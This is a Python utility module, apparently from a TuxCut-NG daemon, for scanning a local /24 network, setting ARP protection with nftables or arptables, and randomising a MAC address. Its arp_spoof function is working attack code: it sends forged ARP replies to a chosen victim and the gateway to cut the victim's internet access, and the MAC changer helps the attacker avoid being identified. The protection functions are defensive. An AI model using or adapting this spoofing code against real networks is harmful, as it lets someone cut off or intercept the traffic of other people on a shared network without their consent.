"""
TuxCut-NG  —  utils.py
Utilities for the daemon: network info, ARP spoofing, protection.
Works on Fedora 43+ (nftables, kernel 6.x) and Debian 12+.
"""

import os
import sys
import re
import socket
import subprocess as sp
import logging
import random

from scapy.all import ARP, sr, send, arping, get_if_addr, get_if_hwaddr

# ────────────────────────────── Logging ──────────────────────────────
LOG_DIR = '/var/log/tuxcut'
os.makedirs(LOG_DIR, exist_ok=True)

logger = logging.getLogger('tuxcutd')
logger.setLevel(logging.INFO)
_fh = logging.FileHandler(os.path.join(LOG_DIR, 'tuxcut.log'))
_fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s'))
logger.addHandler(_fh)
logger.addHandler(logging.StreamHandler(sys.stdout))


# ─────────────────────────── Network helpers ─────────────────────────

def _run(*args, **kwargs):
    """Wrapper: run a command silently, return CompletedProcess."""
    return sp.run(list(args), capture_output=True, text=True, **kwargs)


def _cmd_exists(cmd: str) -> bool:
    return _run('which', cmd).returncode == 0


def get_hostname(ip: str) -> str:
    """Reverse-DNS lookup via Python socket (no external tools needed)."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ''


def get_default_gw() -> dict:
    """
    Parse 'ip route show default' to get gateway IP + interface.
    Then ARP-probe the gateway to get its MAC.
    No netifaces dependency → works with Python 3.14.
    """
    gw = {}
    try:
        out = _run('ip', 'route', 'show', 'default').stdout.strip()
        # e.g. "default via 192.168.1.1 dev eth0 proto dhcp ..."
        m = re.search(r'default via (\S+) dev (\S+)', out)
        if not m:
            logger.warning('No default gateway found')
            return gw

        gw_ip, iface = m.group(1), m.group(2)

        # ARP-probe to get gateway MAC
        ans, _ = sr(ARP(op=ARP.who_has, pdst=gw_ip), timeout=3, verbose=False)
        gw_mac = ans[0][1].hwsrc if ans else ''

        gw = {
            'ip':       gw_ip,
            'mac':      gw_mac,
            'iface':    iface,
            'hostname': get_hostname(gw_ip),
        }
        logger.info('Gateway: %s', gw)
    except Exception as e:
        logger.error('get_default_gw: %s', e)
    return gw


def get_my(iface: str) -> dict:
    """Get this machine's IP and MAC for a given interface using scapy helpers."""
    my = {}
    try:
        my['ip']       = get_if_addr(iface)
        my['mac']      = get_if_hwaddr(iface)
        my['hostname'] = get_hostname(my['ip'])
        logger.info('My info: %s', my)
    except Exception as e:
        logger.error('get_my: %s', e)
    return my


def scan_network(gw_ip: str) -> list:
    """ARP-scan the /24 subnet and return a list of live hosts."""
    logger.info('Scanning %s/24 …', gw_ip)
    hosts = []
    try:
        ans, _ = arping(f'{gw_ip}/24', verbose=False, timeout=3)
        for _, rcv in ans:
            hosts.append({
                'ip':       rcv.psrc,
                'mac':      rcv.hwsrc,
                'hostname': get_hostname(rcv.psrc),
            })
        logger.info('Found %d hosts', len(hosts))
    except Exception as e:
        logger.error('scan_network: %s', e)
    return hosts


# ─────────────────────────── IP forwarding ───────────────────────────

def enable_ip_forward():
    _run('sysctl', '-w', 'net.ipv4.ip_forward=1')
    logger.info('IP forward enabled')


def disable_ip_forward():
    _run('sysctl', '-w', 'net.ipv4.ip_forward=0')
    logger.info('IP forward disabled')


# ─────────────────────────── ARP Protection ──────────────────────────

def enable_protection(gw_ip: str, gw_mac: str, iface: str):
    """
    Two-layer protection:
    1. Static ARP entry (permanent) via 'ip neigh' → replaces deprecated 'arp -s'.
    2. nftables ARP filter (preferred) or arptables fallback.
    """
    # Layer 1: static ARP cache entry
    _run('ip', 'neigh', 'replace', gw_ip,
         'lladdr', gw_mac, 'dev', iface, 'nud', 'permanent')

    # Layer 2: packet filter
    if _cmd_exists('nft'):
        _protect_nftables(gw_ip, gw_mac)
    elif _cmd_exists('arptables'):
        _protect_arptables(gw_ip, gw_mac)
    else:
        logger.warning('Neither nft nor arptables found; only static ARP active')

    logger.info('Protection enabled for %s (%s)', gw_ip, gw_mac)


def _protect_nftables(gw_ip: str, gw_mac: str):
    """
    Drop all incoming ARP packets except those from the real gateway.
    Uses nftables 'arp' address-family (works on kernel 4.2+).
    """
    # Remove stale table if it exists
    _run('nft', 'delete', 'table', 'arp', 'tuxcut')

    nft_script = f"""\
table arp tuxcut {{
    chain input {{
        type filter hook input priority 0; policy drop;
        arp saddr ip {gw_ip} arp saddr ether {gw_mac} accept
    }}
}}
"""
    result = sp.run(['nft', '-f', '-'],
                    input=nft_script.encode(),
                    capture_output=True)
    if result.returncode != 0:
        logger.error('nftables error: %s', result.stderr.decode())
    else:
        logger.info('nftables ARP protection active')


def _protect_arptables(gw_ip: str, gw_mac: str):
    """Legacy arptables fallback (still available as arptables-legacy on some distros)."""
    _run('arptables', '-F')
    _run('arptables', '-P', 'INPUT', 'DROP')
    _run('arptables', '-P', 'OUTPUT', 'DROP')
    _run('arptables', '-A', 'INPUT', '-s', gw_ip, '--source-mac', gw_mac, '-j', 'ACCEPT')
    _run('arptables', '-A', 'OUTPUT', '-d', gw_ip, '--destination-mac', gw_mac, '-j', 'ACCEPT')
    logger.info('arptables ARP protection active')


def disable_protection(iface: str = '', gw_ip: str = ''):
    """Remove all protection rules."""
    # Remove static ARP entry
    if iface and gw_ip:
        _run('ip', 'neigh', 'delete', gw_ip, 'dev', iface)

    # nftables
    if _cmd_exists('nft'):
        _run('nft', 'delete', 'table', 'arp', 'tuxcut')

    # arptables
    if _cmd_exists('arptables'):
        _run('arptables', '-P', 'INPUT',  'ACCEPT')
        _run('arptables', '-P', 'OUTPUT', 'ACCEPT')
        _run('arptables', '-F')

    logger.info('Protection disabled')


# ─────────────────────────── ARP Spoofing ────────────────────────────

def arp_spoof(victim: dict):
    """
    Send forged ARP replies to:
    - the victim  → telling it that the gateway's IP is at our MAC
    - the gateway → telling it that the victim's IP is at our MAC
    This cuts the victim's internet without affecting others.
    """
    gw = get_default_gw()
    if not gw:
        return
    my = get_my(gw['iface'])

    pkt_victim = ARP(op=2,
                     psrc=gw['ip'],   hwsrc=my['mac'],
                     pdst=victim['ip'], hwdst=victim['mac'])

    pkt_gw = ARP(op=2,
                 psrc=victim['ip'],  hwsrc=my['mac'],
                 pdst=gw['ip'],      hwdst=gw['mac'])

    send(pkt_victim, count=3, verbose=False)
    send(pkt_gw,     count=3, verbose=False)
    logger.debug('Spoofed %s', victim['ip'])


def arp_unspoof(victim: dict):
    """Restore both the victim's and the gateway's ARP tables."""
    gw = get_default_gw()
    if not gw:
        return

    pkt_victim = ARP(op=2,
                     psrc=gw['ip'],     hwsrc=gw['mac'],
                     pdst=victim['ip'], hwdst=victim['mac'])

    pkt_gw = ARP(op=2,
                 psrc=victim['ip'],  hwsrc=victim['mac'],
                 pdst=gw['ip'],      hwdst=gw['mac'])

    send(pkt_victim, count=10, verbose=False)
    send(pkt_gw,     count=10, verbose=False)
    logger.info('Restored ARP for %s', victim['ip'])


# ─────────────────────────── MAC Address ─────────────────────────────

def generate_mac() -> str:
    """Generate a locally-administered unicast MAC address."""
    return ':'.join('%02x' % b for b in [
        0x02,                          # LA bit set, multicast bit clear
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff),
    ])


def change_mac(iface: str) -> str | None:
    """Change the MAC address of an interface using 'ip link' (replaces ifconfig)."""
    new_mac = generate_mac()
    try:
        _run('ip', 'link', 'set', iface, 'down')
        _run('ip', 'link', 'set', iface, 'address', new_mac)
        _run('ip', 'link', 'set', iface, 'up')
        logger.info('MAC of %s changed to %s', iface, new_mac)
        return new_mac
    except Exception as e:
        logger.error('change_mac: %s', e)
        return None
